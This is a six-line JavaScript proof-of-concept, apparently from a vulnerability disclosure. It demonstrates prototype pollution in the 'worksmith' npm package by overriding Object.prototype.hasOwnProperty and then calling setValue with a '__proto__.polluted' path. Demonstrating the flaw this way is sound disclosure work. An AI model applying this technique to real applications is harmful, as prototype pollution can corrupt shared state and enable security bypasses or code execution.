Object.prototype.hasOwnProperty = () => true;
const worksmith = require('worksmith');
obj = {};
console.log({}.polluted);
worksmith.setValue({}, '__proto__.polluted', 'yes');
console.log({}.polluted);